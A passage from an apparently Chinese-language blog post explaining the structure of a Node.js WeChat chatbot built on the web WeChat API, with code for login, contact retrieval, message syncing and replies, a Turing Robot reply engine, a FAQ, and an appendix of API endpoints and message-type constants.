<h5 id="入口程序">入口程序</h5><p><code>index.js</code>: 主执行程序，仅仅引入网络请求的各个函数。</p>
<p>getUUID是一个Promise，注册的所有函数都返回Promise。整个控制通过Promise链实现。<br>Promise链传递的obj参数，来实现各个过程的资源传递或共享。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getUUID.</span><br><span class="line">  then(checkAndParseUUID).</span><br><span class="line">  then(showQRImage).</span><br><span class="line">  then(checkLogin).</span><br><span class="line">  then(parseRedirectUrl).</span><br><span class="line">  then(login).</span><br><span class="line">  then(getbaseRequest).</span><br><span class="line">  then(webwxinit).</span><br><span class="line">  then(getContact).</span><br><span class="line">  then(robot).</span><br><span class="line">  <span class="keyword">catch</span>((e)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(e);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<h5 id="web微信请求相关函数">web微信请求相关函数</h5><p><code>webwx.js</code>: 保存各个请求的函数，请求函数都封装为一个Promise，<br>这些函数大多都修改或使用obj，并将obj在其间传递。比如获取联系人信息的<code>getContact</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getContact</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"初始化成功，获取联系人..."</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> skey = obj.BaseRequest.Skey;</span><br><span class="line">    <span class="keyword">var</span> pass_ticket = obj.pass_ticket;</span><br><span class="line">    <span class="keyword">var</span> timestamp = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">var</span> options = &#123;</span><br><span class="line">      baseUrl: <span class="string">'https://wx.qq.com'</span>,</span><br><span class="line">      uri: <span class="string">`/cgi-bin/mmwebwx-bin/webwxgetcontact?lang=en_US&amp;pass_ticket=<span class="subst">$&#123;pass_ticket&#125;</span>&amp;skey=<span class="subst">$&#123;skey&#125;</span>&amp;seq=0&amp;r=<span class="subst">$&#123;timestamp&#125;</span>`</span>,</span><br><span class="line">      method: <span class="string">'GET'</span>,</span><br><span class="line">      json: <span class="literal">true</span>,</span><br><span class="line">      jar: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    request(options, (error, response, body)=&gt;&#123;</span><br><span class="line">      obj.memberList = body.MemberList;</span><br><span class="line">      resolve(obj);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>似乎很长的样子，然而实际上就是从obj中取出需要使用和传递的，把得到的需要保存的信息写入obj对象。<br>并将obj传给下一个then函数注册的回调函数。</p>
<p>这个文件中放了一个叫robot的特殊函数。<br>用递归的方式来实现synccheck-webwxsync-webwxsendmsg的循环。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">robot</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  synccheck(obj).</span><br><span class="line">    then(webwxsync).</span><br><span class="line">    then(botSpeak).then(robot).</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">console</span>.error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而webwxsync和botSpeak分别对应消息的收发两个部分。</p>
<p>这两个函数实现批量收发信息。</p>
<p>botSpeak中，将obj.MsgToUserAndSend中打包放入的收信用户名和消息列表全部发送出去。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function botSpeak</span></span><br><span class="line">    obj.MsgToUserAndSend.map((msgBundle)=&gt;&#123;</span><br><span class="line">      <span class="keyword">var</span> msgId = (<span class="built_in">Date</span>.now() + <span class="built_in">Math</span>.random().toFixed(<span class="number">3</span>)).replace(<span class="string">'.'</span>, <span class="string">''</span>);</span><br><span class="line">      <span class="keyword">var</span> postData = &#123;</span><br><span class="line">        BaseRequest: obj.BaseRequest,</span><br><span class="line">        Msg: &#123;</span><br><span class="line">          <span class="string">"Type"</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="string">"Content"</span>: msgBundle.Msg,</span><br><span class="line">          <span class="string">"FromUserName"</span>: obj.username,</span><br><span class="line">          <span class="string">"ToUserName"</span>: msgBundle.User,</span><br><span class="line">          <span class="string">"LocalID"</span>: msgId,</span><br><span class="line">          <span class="string">"ClientMsgId"</span>: msgId&#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">var</span> options = &#123;</span><br><span class="line">        baseUrl: <span class="string">'https://wx.qq.com'</span>,</span><br><span class="line">        uri: <span class="string">`/cgi-bin/mmwebwx-bin/webwxsendmsg?lang=en_US&amp;pass_ticket=<span class="subst">$&#123;pass_ticket&#125;</span>`</span>,</span><br><span class="line">        method: <span class="string">'POST'</span>,</span><br><span class="line">        jar: <span class="literal">true</span>,</span><br><span class="line">        json: <span class="literal">true</span>,</span><br><span class="line">        body: postData,</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      request(options, (error, response, body)=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[机器人回复]"</span>, msgBundle.Msg);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>而在webwxsync时，则设计了一种过滤和批量处理机制。这个机制将调用其它函数实现了信息记录和在obj.MsgToUserAndSend列表中推入待发送的<br>用户名和信息打包数据。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function webwxsync</span></span><br><span class="line">      <span class="comment">//body.AddMsgList中是新信息列表</span></span><br><span class="line">      <span class="keyword">var</span> replys = body.AddMsgList.</span><br><span class="line">        filter(o=&gt;(o.ToUserName === obj.username)). <span class="comment">// 过滤不是给我的信息</span></span><br><span class="line">        filter(o=&gt;(SPECIAL_USERS.indexOf(o.FromUserName) &lt; <span class="number">0</span>)). <span class="comment">// 不是特殊用户</span></span><br><span class="line">        filter(o=&gt;<span class="literal">true</span>).    <span class="comment">// 用户定义黑白名单</span></span><br><span class="line"></span><br><span class="line">        map(wechatLogger(obj)).     <span class="comment">// 日志</span></span><br><span class="line">        map(generateReplys(obj));   <span class="comment">// 回复</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 所有回复或处理消息都完成后</span></span><br><span class="line">      <span class="built_in">Promise</span>.all(replys).then(()=&gt;&#123;</span><br><span class="line">        resolve(obj);   <span class="comment">// 在回调中控制权交给botSpeak</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 更新联系人如果有的话</span></span><br><span class="line">      cacheContact(body.ModContactList, obj);</span><br></pre></td></tr></table></figure>
<p>以一种函数式的抽象方式实现消息的过滤、和批量处理（记录或者回复）。</p>
<p>其实更进一步，把这部分从该函数中分离出来。能设计出更好的接口，<br>比如将这些过滤函数和批量处理函数列表以参数传递，动态加载。准备下一步就这么实现。</p>
<p>像wechatLogger这种函数可以充分利用Javascript的高阶函数特性，实现偏函数。<br>包括上面的过滤函数其实也应该这么实现，以通用方式获取和使用obj对象。显然这些过滤函数只需要obj和o（批量处理时的单个项目）</p>
<p>wechatLogger实现如下</p>
<h5 id="消息记录函数">消息记录函数</h5><p>logger函数是一个返回函数的函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wechatLogger</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> o=&gt;&#123;</span><br><span class="line">    <span class="comment">// 对没一条MsgAddList对象o</span></span><br><span class="line">    <span class="keyword">switch</span> (o.MsgType) &#123;</span><br><span class="line">        <span class="keyword">case</span> MSGTYPE_TEXT:</span><br><span class="line">            logTextMessage(o, obj)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            logNotImplementMsg(o, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，把处理不同信息类型的处理逻辑分散到其它函数中，通过这种抽象留下更易于理解和维护的程序。</p>
<p>记录消息时，可能要解析用户名。这个来自缓存，也许不是你的微信好友而本地缓存没有就需要向服务器请求<br>查询昵称信息(webwxbatchgetcontact)。具体方法正如第一部分对微信协议分析所示。</p>
<p>另一方面，群信息和个人信息的差别也需要区别处理。</p>
<p>由于群信息和个人信息的区别，需要分别做处理。</p>
<h5 id="消息回复函数">消息回复函数</h5><p>generateReplys类似wechatLogger是一个返回函数的函数，用来批量生成对应回复信息</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateReplys</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> o=&gt;&#123;</span><br><span class="line">    <span class="keyword">var</span> replys;</span><br><span class="line">    <span class="keyword">switch</span> (o.MsgType) &#123;</span><br><span class="line">        <span class="keyword">case</span> MSGTYPE_TEXT:</span><br><span class="line">            replys = generateTextMessage(o, obj);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            generateNotImplementMsg(o, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> replys;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateTextMessage</span>(<span class="params">o, obj, resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ps = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (o.FromUserName.startsWith(<span class="string">"@@"</span>) &amp;&amp; (o.Content.includes(<span class="string">"@"</span> + obj.nickname))) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 用户名解析</span></span><br><span class="line">    o.Content = o.Content.replace(<span class="regexp">/@[^:]+:&lt;br\/&gt;/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> at 我, 在Username NickName和群的displayName里</span></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 正则escape</span></span><br><span class="line">    o.Content = o.Content.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'@'</span> + obj.nickname), <span class="string">'喂, '</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o.FromUserName.startsWith(<span class="string">"@@"</span>)) &#123;</span><br><span class="line">    <span class="comment">// 其他群信息则不回复</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 过滤换行符号</span></span><br><span class="line">  o.Content = o.Content.replace(<span class="regexp">/&lt;\s*br\s*\/?\s*&gt;/g</span>, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="comment">// <span class="doctag">FIXME:</span> 表情符号修正</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 回复</span></span><br><span class="line">  <span class="keyword">var</span> username = o.FromUserName;  <span class="comment">// 闭包,防止串号，血泪教训</span></span><br><span class="line">  <span class="keyword">var</span> replyPromise = reply(o.Content, o.FromUserName);</span><br><span class="line">  replyPromise.then(rep=&gt;&#123;</span><br><span class="line">    obj.MsgToUserAndSend.push(&#123;</span><br><span class="line">      User: username,</span><br><span class="line">      Msg: <span class="string">"bot&gt;"</span> + rep,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  ps.push(replyPromise);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，具体回复信息的生成分离到generateTextMessage里，生成的信息和回复用户名将一起打包推入obj.MsgToUserAndSend中(防止异步程序出现消息和人对应出错的问题)。<br>webwxsync中要等着这次所有回复信息都生成后再执行botSpeak进行消息发送。</p>
<p>注意：我觉得这里不是什么好的处理方式，但它确实works well now.</p>
<h5 id="对话引擎">对话引擎</h5><p>如上所见，回复信息是reply生成的，reply接受两个参数(收到消息的内容和消息来源用户名)。这个设计将保存处理对话上下文的任务交给了reply函数。</p>
<p>reply函数就是我们真正的对话引擎。我们给他提问和我们的身份，它回复对话引擎的返回。</p>
<p>dialog.js中实现了好几个对话引擎，你可以使用最简单的echo函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">content</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它仅仅返回对话者的给出的消息，我们返回一个代表这个返回消息的Promise。<br>因为，可能你使用第三方的对话机器人，而第三方的服务需要一个异步http请求。比如图灵机器人</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">turingRobot</span>(<span class="params">content, userid</span>) </span>&#123;</span><br><span class="line">  content = content.replace(<span class="regexp">/^[^:]+:&lt;br\/&gt;/m</span>, <span class="string">""</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">`http://www.tuling123.com/openapi/api`</span></span><br><span class="line">    request.get(</span><br><span class="line">      url,</span><br><span class="line">      &#123;</span><br><span class="line">        qs: &#123;</span><br><span class="line">          key: apikeys.turingRobotApiKey,</span><br><span class="line">          info: content,</span><br><span class="line">          userid: userid.slice(<span class="number">0</span>, <span class="number">32</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">        json: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      (error, response, body)=&gt;&#123;</span><br><span class="line">        <span class="keyword">if</span> (error || !body) &#123;</span><br><span class="line">          reject(error?error:<span class="string">"turing robot return no body"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//debug("in turing machine: " + inspect(body))</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          body.text = body.text.replace(<span class="regexp">/&lt;\s*br\s*\/?\s*&gt;/g</span>, <span class="string">'\n'</span>);</span><br><span class="line">          <span class="keyword">if</span> (body.code == <span class="number">100000</span>) &#123;</span><br><span class="line">            resolve(body.text);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (body.code == <span class="number">200000</span>) &#123;</span><br><span class="line">            resolve(body.text + <span class="string">": "</span> + body.url);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (body.code == <span class="number">302000</span>) &#123;</span><br><span class="line">            resolve(body.list.map(n=&gt;n.article + <span class="string">": "</span> + n.detailurl).join(<span class="string">'\n'</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (body.code == <span class="number">308000</span>) &#123;</span><br><span class="line">            resolve(body.text + <span class="string">'\n'</span> + body.list.map(n=&gt;n.name + <span class="string">": "</span> + n.info + <span class="string">"&lt;"</span> + n.detailurl + <span class="string">"&gt;"</span>).join(<span class="string">'\n'</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reject(body.code + body.text);</span><br><span class="line">          &#125; </span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>别忘了填入你自己申请的apikey。</p>
<p>事实上，你可以自己实现成语接龙问答机器人，膜蛤机器人，消息中转机器人……</p>
<p>有人可能奇怪magic目录下是什么东西，瞎逼编概率模型的中文magic对话引擎= =，我会慢慢把它清理出这个项目。</p>
<h5 id="更新本地缓存信息函数">更新本地缓存信息函数</h5><p>记录消息一个很重要的问题是解析用户名，群聊名。因为web微信给你的只是一堆<code>@@xxxxxxxxx</code>这种东西。</p>
<p>我们在getContact时可以获取好友联系人，但不能获得群信息。因此，需要在收到新消息时能对任何不在<br>本地联系人信息列表中的人或群聊进行信息请求(batchgetcontact).</p>
<p>当然，最好是缓存起来而不是每次都请求。</p>
<p>哦，我发现目前代码组织的不是很合适。</p>
<p>总之，两个地方需要更新本地缓存。</p>
<ol>
<li>请求到不在本地缓存中联系人时(batchgetcontact)</li>
<li>在收到联系人更改信息时(webwxsync时检查modContactList)</li>
</ol>
<p>这两部分分布在logger.js和cache.js中。</p>
<p>前者对个人和群聊又做了不同处理。在处理收到的消息时判断是否请求、更新本地缓存等</p>
<p>后者根据联系人信息更新列表直接更新本地缓存。</p>
<p>注意：好友联系人用户为了和http response一致而不做过多处理，写了很多循环。<br>而群聊信息的缓存为了便于查找用户名又设计为Object保存。这种分离也有合适的地方，<br>因为群中个人信息也未必是作为联系人的信息(比如群昵称)。<br>但考虑使用列表和高阶函数特性来抽象和重构群信息缓存部分。</p>
<h5 id="其它">其它</h5><p>一些常量定义，比如要过滤的特殊用户列表，信息种类常量等等, 分离到global.js中。</p>
<h5 id="总结-1">总结</h5><p>说是总结，只是一些想法。我是傻逼，有信口雌黄的地方，请各位教我做人。</p>
<ul>
<li>函数式的js大法好！</li>
<li>sicp大法好</li>
<li>异步大法好</li>
<li>Promise大法好</li>
<li>http大法好</li>
</ul>
<h3 id="实现微信机器人FAQ">实现微信机器人FAQ</h3><ul>
<li>如果我实现的机器人出现多次回复同一条消息是怎么回事？</li>
</ul>
<p>请认真理解synckey的作用和synccheck的意义。</p>
<ul>
<li>如果出现回复串号是怎么回事？</li>
</ul>
<p>可能由于Js的异步造成有些东西不是按你想的顺序进入发送队列的，也可能由于异步你被js的闭包作用域坑了。</p>
<h3 id="附录">附录</h3><h4 id="AngularJS_web微信客户端">AngularJS web微信客户端</h4><p>请使用firefox（当然chromium都行）访问web 微信页面，ctrl-alt-i打开开发者工具，<br>选择debugger一栏，找到你觉得是webwxapp的那个js文件(可能是webwxApp2aeaf2.js)，点击<code>{}</code>按钮美化压缩后的代码。</p>
<h4 id="API一览">API一览</h4><pre><code><span class="string">API_webwxdownloadmedia:</span> <span class="string">'https://'</span> + o + <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetmedia'</span>,
<span class="string">API_webwxuploadmedia:</span> <span class="string">'https://'</span> + o + <span class="string">'/cgi-bin/mmwebwx-bin/webwxuploadmedia'</span>,
<span class="string">API_webwxpreview:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxpreview'</span>,
<span class="string">API_webwxinit:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxinit?r='</span> + ~<span class="keyword">new</span> Date,
<span class="string">API_webwxgetcontact:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetcontact'</span>,
<span class="string">API_webwxsync:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsync'</span>,
<span class="string">API_webwxbatchgetcontact:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxbatchgetcontact'</span>,
<span class="string">API_webwxgeticon:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgeticon'</span>,
<span class="string">API_webwxsendmsg:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsendmsg'</span>,
<span class="string">API_webwxsendmsgimg:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsendmsgimg'</span>,
<span class="string">API_webwxsendemoticon:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsendemoticon'</span>,
<span class="string">API_webwxsendappmsg:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsendappmsg'</span>,
<span class="string">API_webwxgetheadimg:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetheadimg'</span>,
<span class="string">API_webwxgetmsgimg:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetmsgimg'</span>,
<span class="string">API_webwxgetmedia:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetmedia'</span>,
<span class="string">API_webwxgetvideo:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetvideo'</span>,
<span class="string">API_webwxlogout:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxlogout'</span>,
<span class="string">API_webwxgetvoice:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxgetvoice'</span>,
<span class="string">API_webwxupdatechatroom:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxupdatechatroom'</span>,
<span class="string">API_webwxcreatechatroom:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxcreatechatroom'</span>,
<span class="string">API_webwxstatusnotify:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxstatusnotify'</span>,
<span class="string">API_webwxcheckurl:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxcheckurl'</span>,
<span class="string">API_webwxverifyuser:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxverifyuser'</span>,
<span class="string">API_webwxfeedback:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsendfeedback'</span>,
<span class="string">API_webwxreport:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxstatreport'</span>,
<span class="string">API_webwxsearch:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxsearchcontact'</span>,
<span class="string">API_webwxoplog:</span> <span class="string">'/cgi-bin/mmwebwx-bin/webwxoplog'</span>
</code></pre><h4 id="消息类型">消息类型</h4><p>上述webwxsync获得的AddMsgList中可能收到的各种信息。详细的信息种类列表可以参见webwx的angularjs源码。</p>
<pre><code><span class="attribute">MSGTYPE_TEXT</span>: <span class="string">1,</span>
<span class="attribute">MSGTYPE_IMAGE</span>: <span class="string">3,</span>
<span class="attribute">MSGTYPE_VOICE</span>: <span class="string">34,</span>
<span class="attribute">MSGTYPE_VIDEO</span>: <span class="string">43,</span>
<span class="attribute">MSGTYPE_MICROVIDEO</span>: <span class="string">62,</span>
<span class="attribute">MSGTYPE_EMOTICON</span>: <span class="string">47,</span>
<span class="attribute">MSGTYPE_APP</span>: <span class="string">49,</span>
<span class="attribute">MSGTYPE_VOIPMSG</span>: <span class="string">50,</span>
<span class="attribute">MSGTYPE_VOIPNOTIFY</span>: <span class="string">52,</span>
<span class="attribute">MSGTYPE_VOIPINVITE</span>: <span class="string">53,</span>
<span class="attribute">MSGTYPE_LOCATION</span>: <span class="string">48,</span>
<span class="attribute">MSGTYPE_STATUSNOTIFY</span>: <span class="string">51,</span>
<span class="attribute">MSGTYPE_SYSNOTICE</span>: <span class="string">9999,</span>
<span class="attribute">MSGTYPE_POSSIBLEFRIEND_MSG</span>: <span class="string">40,</span>
<span class="attribute">MSGTYPE_VERIFYMSG</span>: <span class="string">37,</span>
<span class="attribute">MSGTYPE_SHARECARD</span>: <span class="string">42,</span>
<span class="attribute">MSGTYPE_SYS</span>: <span class="string">10000,</span>
<span class="attribute">MSGTYPE_RECALLED</span>: <span class="string">10002,  // 撤销消息</span>
</code></pre><p>不同的消息类型有不同的作用和处理方式。web微信的功能包含表情、图像消息</p>
<h4 id="不同的web微信域名">不同的web微信域名</h4><p>微信一路发展，结果有些现在看上去难以理解的东西。早期的微信用户可以直接通过qq注册，而现在已经不行。</p>
<p>对此，web微信竟然采取了不同的域名来兼容各种用户。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// 3105行左右</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = location.host,</span><br><span class="line">  t = <span class="string">'weixin.qq.com'</span>,</span><br><span class="line">  o = <span class="string">'file.wx.qq.com'</span>,</span><br><span class="line">  n = <span class="string">'webpush.weixin.qq.com'</span>;</span><br><span class="line">  e.indexOf(<span class="string">'wx2.qq.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'weixin.qq.com'</span>, o = <span class="string">'file2.wx.qq.com'</span>, n = <span class="string">'webpush2.weixin.qq.com'</span>)  : e.indexOf(<span class="string">'qq.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'weixin.qq.com'</span>, o = <span class="string">'file.wx.qq.com'</span>, n = <span class="string">'webpush.weixin.qq.com'</span>)  : e.indexOf(<span class="string">'web1.wechat.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'wechat.com'</span>, o = <span class="string">'file1.wechat.com'</span>, n = <span class="string">'webpush1.wechat.com'</span>)  : e.indexOf(<span class="string">'web2.wechat.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'wechat.com'</span>, o = <span class="string">'file2.wechat.com'</span>, n = <span class="string">'webpush2.wechat.com'</span>)  : e.indexOf(<span class="string">'wechat.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'wechat.com'</span>, o = <span class="string">'file.wechat.com'</span>, n = <span class="string">'webpush.wechat.com'</span>)  : e.indexOf(<span class="string">'web1.wechatapp.com'</span>) &gt; - <span class="number">1</span> ? (t = <span class="string">'wechatapp.com'</span>, o = <span class="string">'file1.wechatapp.com'</span>, n = <span class="string">'webpush1.wechatapp.com'</span>)  : (t = <span 